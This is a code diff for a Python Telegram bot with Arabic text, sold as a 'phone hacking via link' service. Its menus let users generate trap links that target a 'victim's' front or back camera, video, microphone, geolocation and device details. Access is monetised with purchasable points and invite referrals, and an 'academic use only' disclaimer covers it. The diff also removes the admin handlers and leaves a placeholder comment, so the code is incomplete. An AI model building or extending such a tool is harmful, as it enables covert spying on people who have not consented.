@@ -703,30 +703,326 @@ def check_subscription(user_id):
             return False
     return True
 
+# ============================================================
+#  القائمة الجديدة (واجهة البوت)
+# ============================================================
+
 def main_menu(user_id):
+    user = get_user(user_id)
+    points = user['points'] if user else 0
+    
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton("📷 أمامية", callback_data="camera_front"),
-        InlineKeyboardButton("📷 خلفية", callback_data="camera_back"),
-        InlineKeyboardButton("🎥 فيديو أمامي", callback_data="video_front"),
-        InlineKeyboardButton("🎥 فيديو خلفي", callback_data="video_back"),
-        InlineKeyboardButton("🎙 صوت", callback_data="audio"),
-        InlineKeyboardButton("📍 موقع", callback_data="location"),
-        InlineKeyboardButton("📱 معلومات", callback_data="device"),
-        InlineKeyboardButton("🔬 الكل", callback_data="all")
+        InlineKeyboardButton("🚀 ابدأ الاختراق", callback_data="start_hack"),
+        InlineKeyboardButton("⭐ جمع نقاط", callback_data="earn_points"),
+        InlineKeyboardButton(f"💰 رصيدك: {points} نقطة", callback_data="my_balance"),
+        InlineKeyboardButton("🛒 شراء نقاط", callback_data="buy_points"),
+        InlineKeyboardButton("ℹ️ معلومات البوت", callback_data="bot_info"),
+        InlineKeyboardButton("📞 التواصل مع الدعم", callback_data="support")
     )
-    user = get_user(user_id)
+    
+    # زر الإدارة (يظهر فقط للمديرين)
     if user and user['is_admin']:
-        markup.add(InlineKeyboardButton("⚙️ الإدارة", callback_data="admin_panel"))
+        markup.add(InlineKeyboardButton("⚙️ لوحة الإدارة", callback_data="admin_panel"))
+    
     return markup
+
+# ====== معالجة الأزرار الجديدة ======
+@bot.callback_query_handler(func=lambda call: True)
+def handle_callback(call):
+    user_id = call.from_user.id
+    data = call.data
+    
+    # ====== زر "ابدأ الاختراق" ======
+    if data == 'start_hack':
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("📷 كاميرا أمامية", callback_data="camera_front"),
+            InlineKeyboardButton("📷 كاميرا خلفية", callback_data="camera_back"),
+            InlineKeyboardButton("🎥 فيديو أمامي", callback_data="video_front"),
+            InlineKeyboardButton("🎥 فيديو خلفي", callback_data="video_back"),
+            InlineKeyboardButton("🎙 تسجيل صوتي", callback_data="audio"),
+            InlineKeyboardButton("📍 الموقع الجغرافي", callback_data="location"),
+            InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device"),
+            InlineKeyboardButton("🔬 كل الميزات", callback_data="all"),
+            InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
+        )
+        bot.edit_message_text(
+            "🎯 **اختر نوع الاختراق:**\n\nاختر الميزة التي تريد اختبارها على الضحية:",
+            user_id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=markup
+        )
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== زر "جمع نقاط" ======
+    if data == 'earn_points':
+        user = get_user(user_id)
+        invite_link = f"https://t.me/{bot.get_me().username}?start={user['invite_code'] if user else ''}"
+        
+        msg = f"""
+⭐ **جمع نقاط**
+
+📍 **طريقة جمع النقاط:**
+• قم بدعوة أصدقائك عبر الرابط الخاص بك
+• كل شخص يسجل عبر رابطك يمنحك **1 نقطة**
+
+🔗 **رابط الدعوة الخاص بك:**
+<code>{invite_link}</code>
+
+📊 **عدد المدعوين:** {get_invites_count(user_id)}
+⭐ **نقاطك الحالية:** {user['points'] if user else 0}
+        """
+        bot.edit_message_text(
+            msg,
+            user_id,
+            call.message.message_id,
+            parse_mode='HTML',
+            reply_markup=InlineKeyboardMarkup().add(
+                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
+            )
+        )
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== زر "رصيدي" ======
+    if data == 'my_balance':
+        user = get_user(user_id)
+        msg = f"""
+💰 **رصيدك الحالي**
+
+⭐ **عدد النقاط:** {user['points'] if user else 0}
+
+📊 **إجمالي النقاط التي حصلت عليها:** {user['total_points'] if user else 0}
+
+📨 **عدد المدعوين:** {get_invites_count(user_id)}
+
+💡 **طرق الربح:**
+• دعوة الأصدقاء (+1 نقطة لكل مدعو)
+• شراء نقاط (من لوحة الشراء)
+        """
+        bot.edit_message_text(
+            msg,
+            user_id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup().add(
+                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
+            )
+        )
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== زر "شراء نقاط" ======
+    if data == 'buy_points':
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("⭐ 10 نقاط - 5$", callback_data="buy_10"),
+            InlineKeyboardButton("⭐ 25 نقاط - 10$", callback_data="buy_25"),
+            InlineKeyboardButton("⭐ 50 نقاط - 18$", callback_data="buy_50"),
+            InlineKeyboardButton("⭐ 100 نقاط - 30$", callback_data="buy_100"),
+            InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
+        )
+        bot.edit_message_text(
+            "🛒 **شراء نقاط**\n\nاختر الباقة المناسبة لك:",
+            user_id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=markup
+        )
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== معالجة شراء نقاط ======
+    if data.startswith('buy_'):
+        points_map = {
+            'buy_10': 10,
+            'buy_25': 25,
+            'buy_50': 50,
+            'buy_100': 100
+        }
+        points = points_map.get(data, 0)
+        if points:
+            bot.send_message(
+                user_id,
+                f"🛒 **طلب شراء {points} نقطة**\n\n"
+                f"📌 للشراء، تواصل مع الدعم:\n"
+                f"@YourSupportUsername\n\n"
+                f"أو استخدم الأمر /contact",
+                parse_mode='Markdown'
+            )
+            bot.answer_callback_query(call.id, f"✅ تم طلب شراء {points} نقطة")
+        return
+    
+    # ====== زر "معلومات البوت" ======
+    if data == 'bot_info':
+        msg = """
+ℹ️ **معلومات البوت**
+
+🔬 **الاسم:** بوت اختبار الاختراق
+🛡️ **الإصدار:** 2.0
+📋 **الوصف:**
+هذا البوت مخصص لاختبار الاختراق الأخلاقي.
+يسمح لك بإنشاء روابط ملغمة لاختبار أمان الأجهزة.
+
+👨‍💻 **المطور:** @YourDevUsername
+
+⚙️ **الميزات:**
+• اختبار الكاميرا (أمامية/خلفية)
+• اختبار المايكروفون
+• تحديد الموقع الجغرافي
+• جمع معلومات الجهاز
+• تسجيل الفيديو والصوت
+
+⚠️ **تنبيه:**
+هذا البوت للأغراض الأكاديمية والبحثية فقط.
+        """
+        bot.edit_message_text(
+            msg,
+            user_id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup().add(
+                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
+            )
+        )
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== زر "الدعم" ======
+    if data == 'support':
+        msg = """
+📞 **التواصل مع الدعم**
+
+📧 **البريد الإلكتروني:** support@example.com
+💬 **تيليجرام:** @YourSupportUsername
+📱 **الموقع:** https://your-website.com
+
+📌 **للإبلاغ عن مشكلة أو اقتراح:**
+استخدم الأمر /contact
+
+🕐 **أوقات العمل:**
+من الساعة 10 صباحاً حتى 10 مساءً
+        """
+        bot.edit_message_text(
+            msg,
+            user_id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup().add(
+                InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
+            )
+        )
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== العودة للقائمة الرئيسية ======
+    if data == 'back_to_menu':
+        user = get_user(user_id)
+        points = user['points'] if user else 0
+        
+        msg = f"""
+🔬 **مرحباً بك في بوت اختراق الهاتف عبر رابط!**
+
+⭐ **نقاطك:** {points} نقطة
+
+📋 **اختر أحد الخيارات أدناه:**
+        """
+        bot.edit_message_text(
+            msg,
+            user_id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=main_menu(user_id)
+        )
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== باقي الميزات (كاميرا، فيديو، إلخ) ======
+    if data in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio', 'location', 'device', 'all']:
+        # التحقق من أن المستخدم لديه نقاط كافية (اختياري)
+        user = get_user(user_id)
+        if user and user['points'] < 1:
+            bot.answer_callback_query(call.id, "❌ ليس لديك نقاط كافية! اشترِ نقاطاً أولاً.")
+            return
+        
+        user_states[user_id] = f'waiting_url_{data}'
+        bot.send_message(
+            user_id,
+            "📤 أرسل الآن **الرابط الأصلي**\n"
+            "(الموقع الذي تريد توجيه الضحية إليه):"
+        )
+        bot.answer_callback_query(call.id)
+        return
+    
+    # ====== لوحة الإدارة ======
+    if data == 'admin_panel':
+        user = get_user(user_id)
+        if user and user['is_admin']:
+            bot.edit_message_text(
+                "⚙️ **لوحة الإدارة**",
+                user_id,
+                call.message.message_id,
+                parse_mode='Markdown',
+                reply_markup=admin_panel()
+            )
+            bot.answer_callback_query(call.id)
+        else:
+            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
+        return
+    
+    # ====== باقي أزرار الإدارة (إحصائيات، قنوات، إلخ) ======
+    # ... أضف باقي الأزرار هنا كما في الرد السابق ...
+    
+    # ====== أي شيء آخر ======
+    bot.answer_callback_query(call.id, "❌ خيار غير معروف")
+
+# ====== دالة جلب عدد المدعوين ======
+def get_invites_count(user_id):
+    conn = get_db()
+    count = conn.execute('SELECT COUNT(*) FROM invites WHERE inviter_id = ?', (user_id,)).fetchone()[0]
+    conn.close()
+    return count
 
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
     user_id = message.from_user.id
     user = get_user(user_id)
+    
+    # معالجة كود الدعوة
+    if len(message.text.split()) > 1:
+        invite_code = message.text.split()[1]
+        conn = get_db()
+        inviter = conn.execute('SELECT user_id FROM users WHERE invite_code = ?', (invite_code,)).fetchone()
+        conn.close()
+        if inviter and not user:
+            invited_by = inviter['user_id']
+        else:
+            invited_by = None
+    else:
+        invited_by = None
+    
     if not user:
-        create_user(user_id, message.from_user.username or '', message.from_user.first_name or '', message.from_user.last_name or '')
-    bot.send_message(user_id, "🔬 مرحباً بك في مختبر الاختبار", reply_markup=main_menu(user_id))
+        create_user(user_id, message.from_user.username or '', message.from_user.first_name or '', message.from_user.last_name or '', invited_by)
+        user = get_user(user_id)
+    
+    points = user['points'] if user else 0
+    
+    msg = f"""
+🔬 **مرحباً بك في بوت اختراق الهاتف عبر رابط!**
+
+⭐ **نقاطك:** {points} نقطة
+
+📋 **اختر أحد الخيارات أدناه:**
+    """
+    bot.send_message(
+        user_id,
+        msg,
+        parse_mode='Markdown',
+        reply_markup=main_menu(user_id)
+    )
 @bot.message_handler(commands=['admin'])
 def make_admin_cmd(message):
     # تأكد أن المرسل هو أنت
@@ -753,154 +1049,8 @@ def admin_panel():
     )
     return markup
      
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callback(call):
-    user_id = call.from_user.id
-    feature = call.data
-    
-    # ====== العودة للقائمة ======
-    if feature == 'back_to_menu':
-        bot.edit_message_text(
-            "📋 **القائمة الرئيسية:**",
-            user_id,
-            call.message.message_id,
-            parse_mode='Markdown',
-            reply_markup=main_menu(user_id)
-        )
-        bot.answer_callback_query(call.id)
-        return
-    
-    # ====== لوحة الإدارة ======
-    if feature == 'admin_panel':
-        user = get_user(user_id)
-        if user and user['is_admin']:
-            bot.edit_message_text(
-                "⚙️ **لوحة الإدارة**",
-                user_id,
-                call.message.message_id,
-                parse_mode='Markdown',
-                reply_markup=admin_panel()
-            )
-            bot.answer_callback_query(call.id)
-        else:
-            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
-        return
-    
-    # ====== إحصائيات ======
-    if feature == 'admin_stats':
-        user = get_user(user_id)
-        if user and user['is_admin']:
-            conn = get_db()
-            total_users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
-            total_points = conn.execute('SELECT SUM(points) FROM users').fetchone()[0] or 0
-            total_invites = conn.execute('SELECT COUNT(*) FROM invites').fetchone()[0]
-            total_logs = conn.execute('SELECT COUNT(*) FROM user_logs').fetchone()[0]
-            conn.close()
-            
-            msg = f"""
-📊 **إحصائيات البوت**
 
-👥 إجمالي المستخدمين: {total_users}
-⭐ إجمالي النقاط: {total_points}
-📨 إجمالي الدعوات: {total_invites}
-📋 عدد السجلات: {total_logs}
-            """
-            bot.send_message(user_id, msg, parse_mode='Markdown')
-            bot.answer_callback_query(call.id)
-        else:
-            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
-        return
-    
-    # ====== إدارة القنوات ======
-    if feature == 'admin_channels':
-        user = get_user(user_id)
-        if user and user['is_admin']:
-            channels = get_required_channels()
-            msg = "📢 **القنوات الإجبارية:**\n\n"
-            if channels:
-                for ch in channels:
-                    try:
-                        chat = bot.get_chat(ch['channel_id'])
-                        msg += f"🔹 {chat.title} (`{ch['channel_id']}`)\n"
-                    except:
-                        msg += f"🔹 {ch['channel_id']}\n"
-            else:
-                msg += "📭 لا توجد قنوات إجبارية\n"
-            msg += "\n📌 استخدم الأوامر:\n`/add_channel [id] [الاسم]`\n`/remove_channel [id]`"
-            bot.send_message(user_id, msg, parse_mode='Markdown')
-            bot.answer_callback_query(call.id)
-        else:
-            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
-        return
-    
-    # ====== إدارة الميزات ======
-    if feature == 'admin_features':
-        user = get_user(user_id)
-        if user and user['is_admin']:
-            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
-            markup = InlineKeyboardMarkup(row_width=2)
-            for f in features:
-                status = "✅" if is_feature_enabled(f) else "❌"
-                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
-            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
-            bot.edit_message_text(
-                "🔧 **إدارة الميزات**\nاضغط على الميزة لتفعيل/تعطيل:",
-                user_id,
-                call.message.message_id,
-                parse_mode='Markdown',
-                reply_markup=markup
-            )
-            bot.answer_callback_query(call.id)
-        else:
-            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
-        return
-    
-    # ====== تبديل الميزات ======
-    if feature.startswith('toggle_'):
-        user = get_user(user_id)
-        if user and user['is_admin']:
-            feature_name = feature.replace('toggle_', '')
-            new_status = toggle_feature(feature_name)
-            status_text = "مُفعلة ✅" if new_status else "معطلة ❌"
-            bot.answer_callback_query(call.id, f"تم {status_text}")
-            
-            # تحديث القائمة
-            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
-            markup = InlineKeyboardMarkup(row_width=2)
-            for f in features:
-                status = "✅" if is_feature_enabled(f) else "❌"
-                markup.add(InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}"))
-            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
-            bot.edit_message_text(
-                f"🔧 **إدارة الميزات**\n{feature_name.title()} الآن {status_text}",
-                user_id,
-                call.message.message_id,
-                parse_mode='Markdown',
-                reply_markup=markup
-            )
-        else:
-            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
-        return
-    
-    # ====== التواصل مع الإدمن ======
-    if feature == 'admin_contact':
-        user = get_user(user_id)
-        if user and user['is_admin']:
-            bot.send_message(user_id, "📨 أرسل الرسالة التي تريد إرسالها للمستخدمين، وسأقوم بنشرها.")
-            bot.answer_callback_query(call.id)
-        else:
-            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
-        return
-    
-    # ====== إنشاء روابط (الميزات الأساسية) ======
-    if feature in ['camera_front', 'camera_back', 'video_front', 'video_back', 'audio', 'location', 'device', 'all']:
-        user_states[user_id] = f'waiting_url_{feature}'
-        bot.send_message(user_id, "📤 أرسل الآن **الرابط الأصلي** (الموقع الذي تريد توجيه الضحية إليه):")
-        bot.answer_callback_query(call.id)
-        return
-    
-    # ====== أي شيء آخر ======
-    bot.answer_callback_query(call.id, "❌ خيار غير معروف")
+
 @bot.message_handler(commands=['add_channel'])
 def add_channel_cmd(message):
     user_id = message.from_user.id
